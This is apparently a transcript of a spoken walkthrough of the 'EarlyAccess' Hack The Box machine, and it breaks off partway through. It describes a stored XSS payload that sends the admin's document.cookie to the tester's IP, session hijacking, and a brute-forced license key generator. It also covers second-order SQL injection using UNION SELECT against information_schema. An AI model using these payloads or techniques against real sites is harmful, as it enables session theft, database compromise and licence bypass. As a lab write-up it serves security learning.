 what's going on youtube this is ipsec i'm doing early access from hack the box and this box has a lot of different techniques it's got like cross-site scripting sql injection command injection source code analysis it has a lot i lost count at all the steps in this box but there are two things that i really did like about this box actually three now that i think about it the very first one is um a licensed key generator so the whole theme of this box is you're trying to get early access to a game and you've got their source code to a their script that validates license keys so you get to build a key generator to build a valid key to gain access to the game which then opens up to sql injection so i really like the aspect of building that key generator the other thing is um using the binary arp to read files that's something i'd never guess was possible but it does have a capability that enables that and then the other thing that i just thought of that i really liked about this box was weaponizing and denial of service essentially you crash a dock container it restarts it but you poison the script to restart and gain root that way so with all that being said let's jump in as always we start off with an nmap so dash sc for default scripts sv enumerate versions oh a app in all formats bring the nmap directory and call it early access and then the ip address of 1010 11.110 this can take some time to run so i've already ran it looking at the results we see three ports open the first one being ssh on port 22 and its os is going to be debian we can get the exact version right here um the next thing we have is http on port 80 it's running apache and we do see it redirecting us to early access.htb so i'm going to just add an entry in my host file so we have that there so vdc host we can do 1010 11.110 put in that save it and we'll move on to the next one uh we have https on 443 also running apache i'm looking at these versions they are the same the server header is also saying debian so i'm going to assume this is the same exact thing and i look at this just in case there's some type of virtual host routing where like port 80 is going to a different container on the host than 443 sometimes the hearst header will show that then we have a certificate saying earlyaccess.htb and nothing else really there we have the validity date and um yeah let's just go down and that's all the information we have so i'm going to go ahead and navigate to 1010 uh 11.110 and then we have to accept this ssl warning to go over to the early access site and we get a page that says mamba early access available now scrolling down gives us some information about it looks like it's some game developer website some pretty cool graphics talking about multiplayer a newsletter um we got a username which is handy also the address of the place um and looks like a registration link at the bottom but i think that same registration link was at the top so there's a register now and a login the first thing i always do with logins is try to test if we can enumerate valid usernames so i'm just trying admin at earlyaccess.htb put anything in for the password and we see it says the credentials don't match so i'm going to put something i don't think exists on the server and just hit root at ipsec.rocks put this in and the error message is the same so i'm going to go over to the um wait was there a forgot password new to us no forgot passwords also generally how i try to enumerate valid users i'm going to try just admin earlyx.htb again here see if we can see if this is a valid account when we do this it says the email has already been taken so that's one way we can um validate potential usernames or emails so the next thing we do is let's just create ourselves an account so ipsec root ipsec.rocks put the password as password and register for the site now i probably would be testing a lot of other things for like sql injection and weird i did not expect to get a cannot find website so i'm going to try to ping this real quick early access.htb maybe i made a typo in my host file which is always possible e-a-r-l-y-a-c-e-s-s i think that's the same um i'm gonna put a tab here it's probably dns caching or something like that if i now ping it uh well it's resolving the host name but something's wrong with my vpn so i'm just going to do pseudo sudo pkil-9 open vpn restart my client see if i can ping it there we go so my vpn connection probably just died i probably was running two vpns or something like that so let's go and re-register so ipsec root ipsec dot rocks put the password in and there we go we are now registered so we can see a few more things available to us we got messaging with inbox outbox and a contact us we have form and we see something about game keys we could read all these post to see what is going on here critical bug and the scoreboard um username returns a strange error and it's signed the single court man so that's probably a hint at sql injection later on in a scoreboard we probably should be taking notes but um it would make this video take a lot longer this is gonna be a long video begin with so looking at this um we have something about the game key not working but let's just move on uh store is under maintenance we got register key so the first thing i want to do is log out actually and we're going to try putting sql injection stuff in our username so register now we can do ipsec single quote put the email um you can just say test test.com put a password in see what happens and it says invalid characters and when i sent that i saw this go into the loading so i know it wasn't javascript that had prevented it we could also send it through burp suite but um not going to do that so if we can't register with a single quote in our name i'm going to see if we go over to profile if we can change that here so i'm just going to put a single quote there and we do we have ipsec single quirk so that is something we can do it doesn't look like it triggers anything like i don't see an error message here if i go to profile nothing's erroring out i'm going to try it on my email and see right here my page didn't do a loading thing it just immediately said this is not valid so this is where i'm going to send it over to burp suite and we're going to see what happens if i um send this valid then we go down here and we can try to put an invalid thing in my email and we just get a server error so i can't put single quotes in email we can see where we're logged in so we could try logging out of other browser sessions it does identify us as firefox so we could try doing some sql injection somewhere in a user agent there but i'm going to go over to this messaging thing and if i go to this contact us i'm going to just put some basic html here so let's just test it with a head h1 tag and if it processes html chances are it's going to be vulnerable to cross-site scripting whenever i do this i also intercept so we can see what we're sending and let's see we got a token and cross-site request forgery token so i don't know what the difference between these two things is but whenever we do automation we just have to remember there's some cross-site forgery stuff and we're sending a message to the email admin early access we're putting all this stuff here i'm going to change this to my email to see if we get a message in our inbox so i'm going to do email h1 root at ipsec dot rocks slash h1 just to see if somehow it gets to us for that to intercept off uh cannot find the user you are trying to message so that did not work let's do test let's try this again h1 h1 test slash h1 and the reason why i'm not just doing it in the repeater tab again is because of all those cross site request forgery things it does slow us down a little bit so let's see the email i'm gonna try root at ipsec.rocks without any cross-site scripting i should have known that wouldn't match because it's probably just doing a select on that so um now we can forward it see if we get a message we do and we have message from ipsec test test and one thing that uh we may have here is called state scripting in a username so we can also change our username for that i went into view source because i want to show how this is protecting against cross-site scripting so it has converted the greater than in less than to html entities this is n less than and greater than so this is why your browser displays those brackets but isn't processing them so i'm going to do the same exact thing but i'm going to try it against my actual username and we'll put the cross-site scripting here and the other thing i could do is like a script source to point it at like um my own box but typically i'm lazy and i don't do that when sites are https because if you go to a https site and try to include an http site it's going to fail and additionally i could stand up an https endpoint but chances are the certificate validation is going to fail unless i did something like um let's encrypt to generate a valid ssl cert which is a lot of work so i try to avoid that when i can first because it may burn like 15 to 20 minutes setting up that proper web server when it's not even needed i should just learn like cadi which is a application that does all that stuff for you but if you wanted to go pull it up you can just google uh let's see if we can find it real quick turn five a proxy off caddy ssl call it to go to google and it's this caddy server so this is something that's really cool i've used one of two times but just not familiar enough to show it so um let's go back to the um crosstalk scripting chest so my username is ipsec with h1 and i'm going to go back into the messaging contact us and we can say issue task test and i'm going to send this through burp suite and i forgot to do something so test test send it through burp suite intercept is on and we want to change this to be root ipsec.rock so it goes to us intercept is off we look at this click on the email and we can see cross-site scripting so now that what i'm going to do is actually force the web browser to change location so i'm going to change my username to be ipsec and i'm just going to put some javascript so document.location and we can make that let's see javascript document location i can't remember if it's just equals or putting it as a function okay so it's just equals is equal to http 10 10 14 8 and then i'm going to do question mark c is equal to and document dot cookie i think it is i can probably just go in my console tab do document dot cookie i always mistake like cookies or cookie so it's document.cookie and slash script so again normally i would point this and do like script source as equal to my ip but in this case it's a lot of effort because it's https so i think this is going to work thing i need to do is a python3 m hdb.server listen on port 80 and to do that i should be root but i don't want to expose this whole directory so whenever i host a web server i try to get in the habit of hosting it in a www directory i created otherwise all my notes or whatever i have in that directory gets exposed to whoever can access the web server not good so save this now we want to send another message test test and since we can actually validate messages i'm going to do this to myself so we have this and say root ipsec dot rocks we could leave it at admin and just see if it works but again i hate targeting a user without knowing it works so let's see is this it and here we go we see as soon as i clicked on the message my web browser went document that location and loaded this whole string so again not the best way to be stealth when doing cross-site scripting because this was super obvious however it is the um safest way with or not safest the quickest way since it was ssl so if i go back to this i can see my own cookies so let's go back to the messaging form and we go contact and we can say um test test what i'm going to just do please subscribe this message is going to go over to the admin and when the admin opens this message if he does it should go and collect his cookie so i'm gonna wait a few minutes just to see if anything happens and i guess while i wait um i should probably do some type of enumeration so this probably isn't php or anything because i don't see php here i'm guessing a python web app but i'm just going to enumerate virtual host while i wait since we know it's using ssl and does have a host name so go buster v hearst uh dash u give it that i'm gonna do dash k so it ignores ssl certs desk w for word list and we can do um opt set list is it dns or discovery probably discovery dns and just pick one of these i'm going to do top 5000 dash o vhairs dot out so now we have some type of enumeration and oh god the size the status is always going to be 200 but the size is what is important so we'll probably look at the size once this is finished and see if there's anything not one two two seven nine and it looks like we do have a cookie as we're working so real quick i can cat v host dot out because it's writing as it sees it i'm going to grep v one two two seven nine and we don't have any hits yet so just let that keep running while we grab this token so crosstalk request 4g token we don't really care about we want this early access session so i'm going to grab this and then we see html or yeah html encoding here with that percent 3d i'm just going to go over to cyber chef so we can quickly decode that i always keep this up as i work because it's so handy to just be able to decode and encode things so quickly so your led code i don't know if it's even necessary but it's what i do so i'm going to go in my storage tab we can change this token and it's actually url encoded here so we probably don't have to do that okay i'm going to hit enter on profile and we probably need to turn burp suite off or turn intercept off and burp suite either or and here um admin user can't be edited because we are now logged in as admin we have the messages so we could look at inbox things like that but probably not that important what i want to see is the admin panel and we got developer and game and it looks like these are both virtual hosts dev dot early access and game dot early access so let's add those into our host file so sudo v at sea hosts and we can do dev.earlyaccess.htb come on oh god let's just dev.earlyaccess.htb i just did period to type it again and this time we can do game so now both of these should resolve we got a login looks like dev requires an admin credential to log in and there's a lot of other testing we can do for instance we can try logging into this we can intercept this request try logging with our user but if we try to fuzz all these things this video is literally going to be forever so i'm going to look at the other features of this admin panel and i'm going to click download backup and this should get us something so download key validator which is an offline application save this and let's explore exactly what this application is so let's go cp downloads there's a backup.zip i'm going to move that to my directory and i'm going to call this key validator i'm going to go here and unzip it and the reason why i always do this is if the zip had a lot of files it could just trash the working directory i was in so i tend to just avoid that so if we look at this we have a pretty big python script and it tells us the format of the key this is a regular expression so the very first piece is alphanumeric five digits or five characters so this could be numbers as well the next piece is going to be the same thing alphanumeric uppercase as well five characters the next piece alphanumeric four characters and this one can't be digits it's just uppercase so i'd said alphanumeric but strict uppercase right here and then one digit then we have the alphanumeric five characters and then four digits at the end so if we view the rest of the script i'm guessing it's going to tell us exactly what piece is which and we have g1 g2 g3 and what that's calling is each of these pieces so this is g1 g2 g3 g4 and maybe g5 there so you can see how this works and right here it's going to it's doing a list comprehension which is a bit hard to read i'm going to break up each of these and we'll just show the code to show what it's doing but it's doing a bit shift left and then modulo 256 and then this is a xor it's not a to the power thing to the power is two multiplication signs this is xor so we'll figure this piece out soon um this one looks like it's grabbing a small piece see how does this work so how it checks it's going to check if g1 is valid then it's going to check if g2 is valid that's going to check if g3 is valid then g4 and then cs which is checksum so generally how license key things work is they're just multiple pieces it gets really difficult when these pieces depend on other pieces but it when we analyze this um this is going to be a completely static piece and i believe this piece is going to depend on this first piece and since there's no other dependencies it doesn't make it that hard to generate a license key thing because the only thing we have to keep in mind this piece generates that depends on this this is a completely static piece this piece is going to be the only thing we have to brute force if we go to what g3 is let's see g3 it's actually going to sync with the api server and depend on a magic number and that magic number is hardcoded in the script to 346 but it may not be the same on the server so it's probably dependent upon time and that's the only tough piece to this but because this like nothing depends on this it's super easy to generate a key because um this is the only piece that's changing if we find out values of these three that um don't change then all we do is replace this piece and we're done so that doesn't make sense hopefully it's going to make sense in a minute so i'm going to make the game b uh i'll just call it game sure so let's do g1 dot pi real quick and let's go to the g1 function here to figure out how we can get a valid function so i'm going to input string and that's going to give me like string uppercase because we know um it uses that a lot and i could just create a list of all uppercase characters but i rather just type string.uppercase the next thing i'm going to do is import sys so i can get argv into the clipboard and we're going to essentially rewrite this function or this list comprehension and give all characters because all we need is the key to begin with 2 2 1 8 1 and 1 4 5. so we're just going to redo this math for everything in uppercase and look for when it equals two to one so four let's do v and string.ascii uppercase then we can say here i'm going to do i is equal to sis.org v 1 and the i here is just enumerating each spot in the key so it's doing one character at a time it's the eyes normally stands for iterator but for this i just want to hard code it or set it as a variable and the thing we need to do is x is equal to board this is going to convert a character into number so if i do python 3 board x you can see it just converts it to a number so that way we can do it into a bit shift and then we want i plus one and this is in parentheses percent 256 to ord v again or um that's not two that's xor so if we want to look at this and understand what a bit shift is if i do one bit shift one it's two one bit shift two is four three is eight and what is happening here is it's taking the one which is in a binary value and then it's shifting that bit to the left one and when we do it two it's shifting that bit two over and that's why this value is changing so if we did something like this and did a bit shift one then that 101 at the end just moves here and the 101 shifts over or to the left one position so that's all that bit shift is and then we can also validate the xor thing so you may think 2 2 would be 4 it's 0 because anything x word with itself is going to be 0. again if you think of it as you normally write it on paper or something like that is to the power you have that as star star so hopefully that clears up any confusion you may have of this so now all we have to do here is print f and we want to do v x if i do python3 g1.pi zero i can only concatenate string or string not int let's see this is here do i put this as in like this because it read sis.rgv as a string so it was doing bit shift i and thought i was a string no it doesn't so what this does is tells us what the value of every uppercase character is going to be after this math so we want to look for two to one so i'm just going to grep two 1 and we see that is k so i'm going to change that to b 81 and we also have to set the incrementer because this is i plus 1 so the second character and we start at 0 because computers like starting at zero but e so the first character is k second character is e then we want the third character so we do two great for 145 and that's y so we know the first three characters in this have to be key and then the other characters in this it's just trying to make sure it's an int and if it's not an it return false so g1 is literally just key 01 or key 99 or anything like that so we know that so v notes g1 equals q01 so let's move over to g2 so now it's just taking um probably the i think odds and even numbers here so let's do python 3. g2 is equal to abcde so five upper uh characters if i do g2 colon colon 2 we see it's grabbing every other character so a c e and if we do one colon colon 2 it's grabbing these two characters so all we have to do is find things when these three characters equal these two characters now we could try to find every possible combination we can do that first i guess so the proper way to do this to find all valid locations would be like from edit tools import product and what product does it's going to allow us to generate every permutation of a number so import string so p1 is equal to the product string ascii uppercase plus string dot digits and then repeat is equal to i'm just going to do two first so we can show exactly what this is doing but we will do everyone so i'm going to save that and what i'm going to do is something that oxdf just taught me i'm going to execute this with dash i and what that's going to do is run the script and then drop me to an interpreter after so i can do p1 and we see it's iter tools product object i'm going to do 4 i n p1 print i and it's doing every permutation or every possible combination of two characters right so you can see how that's working so it starts with a does every combination after a then b every combination if it's just with b and so on it's a lot of things right what if i can just do lan p1 and c lan p1 um let's see if i convert p1 to a list does that work yeah i'm not exactly sure how to do that but hopefully you get the point so the very first one we need three characters and then the second one product string ascii uppercase plus string digits repeat two and let's see actually um i'm going to need to convert this out of this edit tools object um shoot let's do repeat two so p2 is that let's see um dot join so what i'm doing here is a list comprehension to join everything together and there we go so now it's just a list thinking about it more there's 1296 combinations but p1 is equal to and p1 copy that but change it to p2 and then we can say 4x and p1 4y and p2 if the sum and here i'm just copying from this top here so byte array x dot encode is equal to the sum of the byte array y encode print everything else so x0 plus y0 plus x1 plus y1 plus x 2. and we would run the script and these are all possible values that we could use here there's going to be a lot of them probably the better way to do it if you didn't want to wait this long to generate them all is we only need one value here right because if we go back to this string or this key g2 is never used again after generating it so as long as we can pass this it really doesn't matter because nothing's really using it so we can just use a static key here so um we could just pick any one of those or we could have done something super simple so i would have just done this so values is equal to string ascii uppercase plus string dot digits and then we can say four x and values for yn values if or x times 3 is equal to ord y times 2 print x plus y plus x plus y plus x so i'm guessing in a lot of write-ups you're going to see something like this they'll probably do list comprehension to limit the lines there because that's a bit messy to do it but all we're doing here is just quickly finding values where they conflict so o h o h o h is a valid key again this works because this is never really used elsewhere so we don't have to get all possible values if that like um magic key depends on more than just one piece so like in the whole checksum it did something with the magic key then this would become much tougher because we'd have to try more values in g2 but again g3 is the only piece that matters for the key so this is dependent if i can type on magic so here what are we going to do so we're going to take something take the very first two characters and see if it equals magic value if we go to the top of the script magic value it begins with xp and is the same on the api so we know key 3 starts with xp and then it will return g3 encode let's see so this is xp and then taking it and encoding it with the um magic number so this is the piece that we have to kind of um brute force or break and the vulnerability here is there's only going to be 60 potential values we can prove that by if we go back to a python interpreter and we say g3 is equal to let's do xpaa 0 because we know it starts with x b based upon that magic value a a i'm doing that because that's the lowest possible number it can be and then 0 because it's got to be a digit at the end so if i do that and we say sum of byte array d3 dot encode c12 i think i'm missing one more we get 346. so i'm going to change this to be zz9 and now we're going to be the highest potential number this can be and we do this it's four or five so if we do 405 minus 346 we get 59 but um zero counts as a number here so there's really 60 possible things the key space between the lowest possible key here and the highest possible key here is 60. so let's go and build our collision so v g3 dot pi and we're going to do the from error tools thing again to import product import the string and then p1 is equal to product string ascii uppercase repeat equals two and we did this because we just have two characters that it could potentially be because it begins with xp then we have two characters and then a digit so p1 is equal to join i for inp1 and then i'm going to create a dictionary and the reason why i'm doing a dictionary is because i only care about the end number at the end so if i create a dict uh i don't want to call it that we can just call it d and i do d1 is equal to or we can say 346. it's equal to abc if i print d346 we get abc now remember there's like 1269 potential things in this string right but we know the math is only going to turn out to be one of 60 numbers so later on another combination is going to set 346 and that could be like d-e-d or something and in that case the length of d stays the same because it's just a like uh dictionary or set or something so that's what the logic here is so we're gonna go through every combination in p1 and then for each of those we're going to do in range 0 10 and this is going to be 0 through 9. it always stops at 10. so if i did 9 it would only do 0 through 8 which could be bad and we can say um the confliction is equal to a conflict is a word word a bad word i forget what i called it before um but we're just doing the math here so byte array and it's going to begin with xp and then it's going to be the permutation and everything needs to be a byte so that's why i'm doing it this way and then it has to be the number so that i'm doing it again string i to go from integer to byte because this is always going to give me an int and then we have to encode it and now exit that and we can say uniques conflict is equal to and the same exact thing so xp plus x plus stri we can just leave this as a string here and if we do this we can join or we can just run this real quick python3 g3.pi add the dash i so we drop into a debug and if i just say uniques we have a list of 60 things hopefully um okay len uniques yeah there's a total of 60 values here so 346 xbaa zero we knew that one because that's the one we started with xp ba0 leads to 347 so these are potential values here for when the magic key is set to something and this is something that changes on the server every 30 minutes as we know from the top here so again the attack here is because this magic number only has a potential key space of 60. if they did this and used multiple fields and increased the key space what we're about to do here probably would not be possible because we won't be able to brute force all the license keys so quickly so all we want to do is print backslash n join unique.values now when we run this uniques i think they called it there we go there's 60 lines of what this could be so hopefully this is making sense this is somewhat of a complex thing to explain i bet if you did it yourself it may make more sense so if we look at g4 now g4 is literally just going to be an xor so ord i or g and it's taking something from the very first piece so this is going to be g1 then it's taking something from the fourth piece again computers start at zero so zero is the first piece then one would be the second piece so it's taking something from here so this would be what zip's gonna do is go through each string of this and take it one character at a time so the very first character of this will be g the very first character of this will be i and then the next loop around the second character will be g second character will be i and it just does an xor there and says when it equals 12 then that's going to be the key so all we have to do here is go back into a python interpreter and we know the very first value is g k right um v notes g one is gonna be key o one so python three so the first value or decay is 75. we don't know what g is but we can find out g by doing xor of 75 to 12 because if we xor these two it equals 12. if we xor this and 12 it would equal this if we xored g and 12 it would equal i because that's just how xors work so we can do order of k xored with 12 and that's 71. if we do convert 71 into a character we get g so again i'm just going to do it like this the second one we have was e right and it's not 12 it is now the second character so four so first character is g second character is a now we want to do 20 and we xor with y m so third character is m 117 is the next thing and this was zero because it was key 0 1 and that's e and then 1 gets x word with zero and that's one so key four is going to be game one and then g5 which is the checksum i guess so i can call this cs we can literally just reuse this because the checksum is really just going to do some math against g1 to g4 if we look at cs where is it yeah it's going to grab everything and then give it the sum so really the checksum isn't a security thing it's to prevent user error if you're familiar with credit cards they do the same thing with what they call the i think lundcheck luhn i know i've probably talked about it before but if you google one check all it does is pretty much add each digit on the credit card and then make sure it equals something at the end so the last digit of the credit card isn't really unique it's just calculated based upon all the previous digits and the purpose of that is to identify if there's a typo in it because if it's just generated that way um the website can identify if what the user entered is valid before they send it to the credit card processor because if they send invalid ones they pay like per transaction right so you don't ever want to send a invalid credit card number to the processor because it costs you money so what they did if they implemented a one check so if a user makes a typo on one digit you can validate it's a invalid credit card without sending it there doesn't mean once it gets to the processor that the credit card's valid because you can just do the lunch check yourself and generate a bunch of numbers but you know it's not a typo on the user part right so that's all this checksum is so all we have to do is now combine everything we have to build a uh generator so i'm going to do vi gen dot pi we can exit this first so we have a bigger working space and begin the key piece of this code depends on g3 that's the only thing that has like 60 potential keys everything else is static so what i'm going to do is copy that piece so if i cat g3 dot pi we can just copy this in so go over here paste and then we just want to make this to be a function so i'm going to indent it we can say def gen 3 and then give it a comment so calculate the 60 potential values magic dumb can be returns a list okay so that should be good and all we want to do is return the list so return list uniques dot values because we just want a total of 60 keys so the next thing we have to do is the checksum so i'm going to just copy that straight from the key validator and we can just copy this paste it in we can unindent this and just give it the documentation and then we just need to generate keys so i'm going to create a list and then 4k in gen3 so that's going to generate a list of 60 keys i can say now key is equal to uh f key 01 dash o h o h o and these got to be capitals dash k so it's going to generate all the potential things 3 can be and then dash game 1 because we know this is determined based upon this if this was key two this would be game two um if we went into the higher numbers then this would be different but we know that's going to be the same and then the very last piece we just need to calculate the cs of the key so you just say key is equal to that and now keys dot append and we can say f key dash calculate cs of the key i think that will be it print k actually let's not even print k let's execute with python dash i gen dot pi dash i string has no attribute key so calc cs we did something wrong string has no attribute key where is this 24 gs self.key.split you put it like that let's see gs import pdb pdb.set trace execute again let's see self.key has no attribute galaxy s i'm giving it the key print key key01 so that's what it should be calculating the cs off of so it knows key there oh maybe it's not self so i'm going to say key and we can get rid of this because before this was used in a class so that should fix that keys and now we have a list of potential keys we could do len keys it should be 60 keys and all of these should be valid now the issue is um we don't know which of these is valid for the game client we could go and paste in 60 but by the time we do that manually um it may not work and also i just noticed some of these will fail because um see if we go back to gen or not jen the validate key validator validate or is it the last piece has to be five digits when are checksum is generating four digits that is not five so we probably have to um prepend zeros here so let's go back into a generator and then let's see we can say checksum we'll just say checksum is equal to this like that now we can say keys dot append and this will be okay dash check sum but we have to figure out the formatting to convert checksum into always being four digits so i'm just going to go up here and say o4 like that and say dot format cal key and we can show what this does in our interpreter so if i do n is equal to 1 and i just print n it's going to print 1. if i did 0 2 and i have to put that in quotes dot format n now it's a one if i do five we have n always being five spots so that's all i did there is that small trick to make sure it's always going to be four digits so now if we 4k and keys print k if i run generator it's always going to be four digits so instead of 980 there we have the whole thing um only enough i don't have the whole key i screwed something up it's not k it's key dash checksum there we go so now we have the whole keys and this will get for every salt so now all we have to do is automate not every salt every magic number but as now all we have to do is submit all of these so we go back to this and we have to now import request because we're going to automate submitting the request um probably one of those i can just do line break and let's see if i go here i get my early access see that's just bringing me the game i want to go log in back to myself so we can generate a key so root ipsec.rocks login with password register a key and we just want to see exactly what this key is so i'm going to go into burp suite and intercept is on we need to take a key i'm just going to take this because it's valid if this turns out to be the right key man this just became super easy but i doubt it is so we send this key i'm going to save that request and repeater we forward it then we do a get slash key so i'm guessing it sent us a redirect and we see here gamekey is invalid so essentially we want a request to be able to submit this and check the response if it is invalid and instead of coding like a login function to our script i'm going to be lazy i'm just going to hard code the session so i'm going to say at the very bottom um let's see trying to think since xsrf token is in a cookie i'm gonna do a request session so this way i don't have to bother setting this if i just do a request session i do a get page the page will say set this to a cookie and the request session will automatically do that so we can start the session so s is equal to request.session then we can say cookie is equal to paste in the cookie and i'm just going to give it that equals i don't know if we need to do that or not did i do that correctly yeah got rid of the percent and change that and then we can do s dot cookies dot set and this cookie is called early access underscore accession then we pass it in the cookie and then the domain this works on is early access.htb so that should be set there then the next thing we want to do i'm going to send this over to burp suite so i'm going to do s proxies is equal to https and then http 127.001 8080. and then we can say s dot proxies dot update give it the proxies so now we are pretty much set there we want to get the key page so we can do s dot get and grab this and then i'm going to say verify is equal to false because we don't care about the ssl certificate otherwise it would complain and the next tough piece is going to be we have to get this value of this so r equals that but we need to know this token most likely and to do that we have to parse this html to find where that token is now we could do a bunch of ragex and just find it easily but a lot of people complain when i use regex against it instead of using beautiful soup so let's use beautiful soup to grab hidden fields because i don't think there's really any here right there's two matches and both those matches are going to be the tokens so it doesn't matter um what one we grab because the birth token and the both set to the same exact thing the first thing we want to do is import beautiful soup so i can say um from bs4 import beautiful soup and if you don't have it you can just do like a pip3 install on i think bs4 beautiful soup but it's a super popular library if you just google around you'll find it and now we just have to build the soup so b-a-u-t full soup if i spelled that correctly that would be a miracle and we process r.text because that's going to be the response and then we want to say it's xml like that and now we can just do token is equal to soup.find we look for input values as a type of hidden and then we want the attributes of that of value right so we're getting hidden and then we want value we've probably could have searched for name as token as well but we're just searching for hidden and grab value the reason why doing hidden because some applications actually like i've noticed a lot i think in asp.net sometimes the name will have some hash on the end of it but it'll always be hidden so that's why i'm grabbing that and i think we just closed that off right no we closed it with this so i'm going to now print token to make sure this all works so if i run gen uh we have this error message but we do get the token um it comes twice because i think it's getting redirected but all we care about is that token uh let's see python requests hide ssl error we gotta like import url lib and set something right let's see old merge where is a good thing right here so copy this line of code paste run and we no longer getting our message okay so now we have a token so the next thing we have to do is just submit 60 keys so we can say data is equal to this is going to be our post parameter and to submit a key we need underscore token so underscore token and that's going to be the value of token and then the key and that's going to be the value of k and we can say r is equal to session.post then https earlyaccess.htb slash key i think it slash add yep add data is equal to data and verify is equal to false and what is it saying i think that little tool box popped up and that's why that red dot came and then we say if where is the game key error message early access i'll do it in double quotes and we don't have to do the whole thing we can just say if game key is invalid in our text print key so this will hopefully work and i'm going to go over to my burp suite intercept is off but i can look at the history so i can see it working if i look at this key add we can send that over to repeater and we can see we got that xrf token the early access session token and key and the key looks fine so now we kind of just wait for a program to hit a valid key and we can keep watching this to make sure it's working and hopefully it does um yeah i guess we'll just wait apparently we have an error message somewhere since it ran through all 60 keys and we don't have a hit which i guess sucks um let's see i don't know what we could have done differently if i refresh my page nothing's there let's see if gamekey is invalid oh wait we should be getting this every time because i should have done not n so what is the error message we're getting here um this is weird r is equal to that so say print or dot text and put weight okay so i'm looking for some type of error message and i am getting what looks to be the login page because i don't see any error message we just have that login and register here so let's see we want to key then we do this post i wonder if my session is wrong how i did this oh my cookie is completely wrong i copy the whole thing we just want the actual data now if i run this we see game key is invalid and if i paid attention to what i was intercepting if i do repeater you can see let's see let's go to proxy post key add it's weird i especially early access session is equal to early access session but it keeps doing a get login so oh is that me no we're hitting login and add so i shouldn't notice that when we saw the request warning because i was doing a request on key and we saw two ssl errors because i was requesting key and they were sending me a 301 or 302 redirect to slash login and i think that's where all my issues came from um i think that's fixed with that weight and we want to say not in our dot text and try this again if we go look at this now we don't see that login at all before we kept hitting login so hopefully this now works um i guess i shouldn't be printing every time let's just get rid of that and run through the list i'm going to give it like probably 30 60 seconds to run through and hopefully we have a hit soon and it looks like we still don't have a key which is puzzling because i thought that should work so i'm going to do if game key is invalid in r.text print it so this should print every key right yes because every key is going to be invalid and we're going to change that back to not in what i was doing there is testing that i'm reading the right output i'm going to try going against my judgment and changing the checksum to not always be four digits so we'll submit potentially three digit checksums to the site and see what happens um let's see not n then we can say else yeah we'll just leave it at that okay generate this if we start seeing a lot of messages or like a lot of keys coming out that are three digits we'll submit one of those to the website and see if it accepts it actually we can test it so if i grab this 067 it should say wait what add key invalid oh i'm guessing i just broke the crosshair script scripting on my session 967. i'm going to stop this 967 is that going to be interesting so both 967 and 0967 get game key is invalid if i do like ip01 let's see oh it's still invalid i wonder if that means something i'm doing here is just wrong kia one i would think it would tell me a formatting issue but obviously it's not doing that so it leads me to believe maybe i have an error in how i'm generating one of the keys and i think the only thing that could be is this field xp dao well maybe it's the checksum so we just changed the checksum to always be 967 but maybe how i did this field is bad see is there a way we can validate it so if i look at key validator how do we use this so 346 so let's see cp game we can do yeah gen dot pi is fine v gen dot pi and we want to [Music] only generate one key let's see we want the key for when the magic is 346. so over here turn list unique values so i wonder if i can just do special is equal to dict we can say if we can do list uniques 346. wonder what happens here and we can get rid of all the session stuff and i just want to print for k and g3 okay python 3 gen key error import pdb pdb.set trace do it right there what's uniques look like 346 should be xp8a0 uniques 346 okay i don't want the single quotes just want it like this see xpaa zero let's just grab this and we can say xbaa0 okay so this should give us the key for when the checksum or the magic number is 346. key is not defined there we go and we should be able to put this in the validator and see if it is correct so python 3 validate game key check some failed 0964 entered key is invalid so a checksum is failing that's interesting and that's probably why our script isn't working so what is the checksum what did we screw up so key is equal to that i really don't know how we messed that up if i change one value here let's see what happens oh i could just put it here entered key so we're definitely having an issue with checksum i'm gonna try to take this piece off and see what this does so if i now run gen dot pi do we get a different key one nine one two nine five is this valid paste okay so let's go back to the code and we can show what i did so if i import pdb pdb dot set trace do this we can say what gs is and then i'm going to add the negative 1 like that i think that's how it was we can look at validate i guess yep so i'm going to copy this gs so it was just chopping off the game one i'm guessing in the actual code um what i was passing or what it expects to be passed is a dash at the end so if i left it at that negative one and i put the game one dash here and got rid of this then i'm guessing we're gonna get one two nine five yeah so that was the only thing that was screwed up um and it's validator when it did the checksum was expecting a trailing slash which that negative one got rid of so now we're passing valid keys i wish i caught that earlier or maybe edited the video to remove all this debugging but i'm sure it's valuable to someone and if it's not valuable to you you can always just skip it using the timestamps below so let's go back to gen dot pi and i'm going to guess that we're going to get a different message like something about the magic salt we can just submit it real quick that was one two nine five add key huh we did not it's the same exact error message that makes it easy okay so negative one get rid of that python3 gen dot pi and we'll hope this one actually works we've said that a few times and we've been wrong but i really don't know what else could go wrong here i guess i should be tracing it more but we'll see maybe we need that trailing zero um oddly enough the generator well i guess for this one we don't know because one two nine five so let's see if we go back here v we're not really wasting time because the script's running oh we got one one three two five add the key and now we have game real quick before we progress i just want to go back and check the validator script so if we do key validator validate.pi it's something i should have done before we can look at the check sum at zero nine one comma five so that whole piece about making sure the key is padded to four digits we didn't need so um this you can just ignore that whole line um take that as bonus content if you ever wanted to format something but this script should always work and you get the game added and now when we log in here we should be able to play the game so if i click the play button we just have this little snake clone and then we can replay the game it keeps track of our scores so we can see i had a score of zero i can go to my own scoreboard and it looks like there is an sql injection here because my name still has all that stuff before so i'm going to fix my name real quick just so we can see the intended functionality of the site and then we will play with it and this definitely i like this part of the box a lot because it brings me back to um like some of the very first hacks i did of old flash games because you play these flash games and then you can just intercept the request and put your score to anything you want so even though i'm at zero i could let's see change the score let's go with leet for this then when i go to the global scoreboard i can see i am in the lead with leap points but the actual exploit is your own scoreboard and there's a second order sql injection here we saw it aired out because i still had the cross-site scripting for my payload but let's just go back here i'm not doing this in the repeater tab i'm doing this in browser tabs because of all that like cross-site script request forgery protection so i couldn't submit the same request twice inside of burp which is annoying but we can just do it here so i put a single quote we have an error i'm going to actually i should read that error because it's telling me the syntax so in this case if you did the normal thing of just saying you know what i'm going to see if it goes away if i do a comment afterwards we save it and it still errors and that reason was it's actually using a um parenthesis so let's do single quote parenthesis and then a comment and see what happens no more error only we don't have any name because it's probably trying to match against ipsec and then like this and the database and not working but we can try a union select here so select and i bet if i do one it's going to error because you always have to have the number of sides on the union statement correct and it was name it was three things i forget exactly what the three were probably name score and date would be my guess so i'm going to skip the testing with two and just do straight to three refresh and we can see we have injection here we could do like i think user colon is that going to print the user in sql to see our user we now know we'll probably end some type of docker container since 172 180 102 um if it was like 10 10 11 110 i know i'm not in docker but this i know i'm in some type of docker but we really just care about enumerating the database now so i'm going to go to google i'm going to say information schema table because i don't know this by memory i always go back to the man page of my sequel to get the name i think it's like schemata is the name let's see general tables schema come on where is schema information scheme is schema table or schemata table and i want schema name so i'm going to do a um schema underscore name from information schema dot schemata and this is only gonna give me one result or it's going to error 